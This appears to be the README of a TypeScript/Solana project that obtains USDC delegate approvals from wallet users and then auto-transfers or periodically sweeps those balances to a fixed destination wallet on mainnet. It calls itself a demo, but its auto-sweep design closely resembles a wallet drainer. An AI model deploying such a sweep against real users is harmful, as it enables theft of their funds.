# aurora-ops

English | [简体中文](./README.zh-CN.md)

A TypeScript-based demo for Solana USDC delegation monitoring and delegated transfers.

The project reproduces the closest Solana equivalent of Ethereum's `approve + transferFrom` flow:

1. A user signs an `ApproveChecked` instruction to authorize the backend as `delegate` for a USDC token account.
2. The backend spends from that delegated allowance through `TransferChecked` and sends USDC to a destination wallet.
3. The backend can also monitor delegation changes on-chain, discover approved accounts automatically, and process them later.

Selected GitHub project name:

- `aurora-ops`

## Features

- Builds unsigned `ApproveChecked` transactions for Phantom and other wallets to sign
- Sends `TransferChecked` as the backend acting as `delegate`
- Watches USDC token accounts where `delegate == backend`
- Calculates transferable amount with `min(balance, delegatedAmount)`
- Persists approval state and transfer history in MySQL
- Provides a dedicated approvals page with owner, balance, allowance, and transferable amount
- Reads the default destination wallet from `.env` and lets the frontend trigger transfers directly from list rows
- Runs a scheduled sweep task based on delegated amount and balance thresholds

## Tech Stack

- Backend: Node.js, TypeScript, Express
- Frontend: React, Vite
- On-chain SDKs: `@solana/web3.js`, `@solana/spl-token`
- Database: MySQL (optional)

## Project Structure

```text
.
├── src/
│   ├── components/          # Frontend page components
│   ├── hooks/               # Frontend wallet hooks
│   ├── utils/               # Frontend utilities and tests
│   ├── App.tsx              # Main frontend page and route switching
│   ├── config.ts            # Centralized .env parsing
│   ├── index.ts             # Backend APIs, listeners, and auto-transfer entry
│   └── mysql.ts             # MySQL persistence layer
├── .env.example             # Environment template
├── README.md                # English project guide
├── README.zh-CN.md          # Chinese project guide
└── DEPLOYMENT.md            # Deployment guide
```

## Core Flow

### 1. User Approval

The wallet signs `ApproveChecked` for a USDC token account and sets the backend address as `delegate`.

### 2. Backend Detects Delegation

The backend uses `getProgramAccounts` and `onProgramAccountChange` to monitor only:

- `mint == USDC_MINT`
- `delegate == BACKEND_PUBLIC_KEY`

### 3. Backend Computes Transferable Amount

The backend reads the token account state and computes the spendable amount with:

```text
transferableAmount = min(balance, delegatedAmount)
```

### 4. Backend Executes Delegated Transfer

When conditions are met, the backend signs `TransferChecked` with its own key and sends USDC to the destination ATA.

## Pages

### Home Page

The home page is used to simulate the full flow:

- Connect Phantom
- Build an approval transaction
- Trigger a backend delegated transfer
- Inspect the latest approval and transfer result

### Approvals Page

The approvals page is designed for viewing a large number of delegated records:

```text
http://localhost:5173/#/approvals
```

It supports:

- Showing the owner wallet
- Showing the source ATA
- Showing the delegated amount
- Showing the current USDC balance
- Showing the current transferable amount
- Triggering backend transfer directly from each row

The destination wallet is no longer entered in the frontend and instead always comes from `DEFAULT_DESTINATION_OWNER` in `.env`.

## Environment Variables

Copy the template before running:

```bash
cp .env.example .env
```

Main supported environment variables:

```env
PORT=3000
SOLANA_RPC_URL=https://api.mainnet-beta.solana.com
SOLANA_COMMITMENT=confirmed
USDC_MINT=EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v
BACKEND_SECRET_KEY=
DEFAULT_DESTINATION_OWNER=
ENABLE_APPROVAL_LISTENER=true
ENABLE_AUTO_TRANSFER=true
ENABLE_SCHEDULED_SWEEP=false
SCHEDULED_SWEEP_INTERVAL_MS=300000
SCHEDULED_SWEEP_MIN_DELEGATED_AMOUNT_UI=100
SCHEDULED_SWEEP_MIN_BALANCE_AMOUNT_UI=100
ENABLE_MYSQL_PERSISTENCE=false
MYSQL_DSN=mysql://root:password@127.0.0.1:3306/solana_delegate_demo
MYSQL_CONNECTION_LIMIT=10
MYSQL_WAIT_FOR_CONNECTIONS=true
```

Notes:

- `BACKEND_SECRET_KEY`: backend private key, supports Base58 or JSON array
- `DEFAULT_DESTINATION_OWNER`: default destination wallet used when a transfer is triggered from the approvals page
- `ENABLE_APPROVAL_LISTENER`: enables on-chain approval monitoring
- `ENABLE_AUTO_TRANSFER`: automatically transfers after detecting an approval
- `ENABLE_SCHEDULED_SWEEP`: enables the scheduled sweep task
- `SCHEDULED_SWEEP_INTERVAL_MS`: scheduled scan interval, default `300000` ms (5 minutes)
- `SCHEDULED_SWEEP_MIN_DELEGATED_AMOUNT_UI`: delegated amount must be greater than this value to trigger a sweep
- `SCHEDULED_SWEEP_MIN_BALANCE_AMOUNT_UI`: balance must be greater than this value to trigger a sweep
- `ENABLE_MYSQL_PERSISTENCE`: enables MySQL persistence

If you only want threshold-based sweeping every 5 minutes, this configuration is recommended:

```env
ENABLE_AUTO_TRANSFER=false
ENABLE_SCHEDULED_SWEEP=true
SCHEDULED_SWEEP_INTERVAL_MS=300000
SCHEDULED_SWEEP_MIN_DELEGATED_AMOUNT_UI=100
SCHEDULED_SWEEP_MIN_BALANCE_AMOUNT_UI=100
```

## Local Development

Install dependencies:

```bash
npm install
```

Start frontend and backend together:

```bash
npm run dev
```

Default URLs:

- Frontend: `http://localhost:5173`
- Backend: `http://localhost:3000`

If a port is occupied, Vite may automatically switch to a different one.

## API Reference

### `GET /health`

Returns runtime status such as:

- RPC endpoint
- USDC mint
- Backend delegate address
- Default destination address
- Listener and auto-transfer switches
- Scheduled sweep switch and thresholds
- MySQL enabled state

### `GET /approvals`

Returns the current list of on-chain USDC token accounts delegated to the backend.

Each record includes:

- `sourceTokenAccount`
- `ownerWallet`
- `delegateWallet`
- `balanceUi`
- `delegatedAmountUi`
- `transferableAmountUi`

### `POST /approve/build`

Builds an unsigned `ApproveChecked` transaction for the frontend.

Example request:

```bash
curl -X POST http://localhost:3000/approve/build \
  -H "Content-Type: application/json" \
  -d '{
    "owner": "USER_WALLET_ADDRESS",
    "amountUi": "1.25"
  }'
```

### `POST /delegate/transfer`

Executes a delegated USDC transfer from the backend.

Example request:

```bash
curl -X POST http://localhost:3000/delegate/transfer \
  -H "Content-Type: application/json" \
  -d '{
    "owner": "USER_WALLET_ADDRESS",
    "amountUi": "1.25"
  }'
```

Notes:

- If `destinationOwner` is omitted, the backend automatically uses `DEFAULT_DESTINATION_OWNER` from `.env`
- If the destination USDC ATA does not exist, the backend creates it automatically

## MySQL Persistence

When MySQL is enabled, the backend automatically creates the database and these tables:

- `approval_transfer_records`: latest state per source token account
- `approval_transfer_history`: append-only history of monitoring and transfer events

Typical record states:

- `approved`
- `processing`
- `duplicate`
- `skipped`
- `transferred`
- `failed`
- `delegate_mismatch`

## Development Commands

```bash
npm run dev        # Start frontend and backend in development mode
npm run dev:api    # Start backend only
npm run dev:web    # Start frontend only
npm run build      # Build frontend
npm run check      # Type check + unit tests
npm run test       # Run tests
```

## Security Notes

- Never commit a real `.env`
- Never commit production private keys
- Inject `BACKEND_SECRET_KEY` through a secure channel
- Add authentication, request signing, rate limiting, and audit logs before production use

## Deployment Guide

See:

- [DEPLOYMENT.md](./DEPLOYMENT.md)
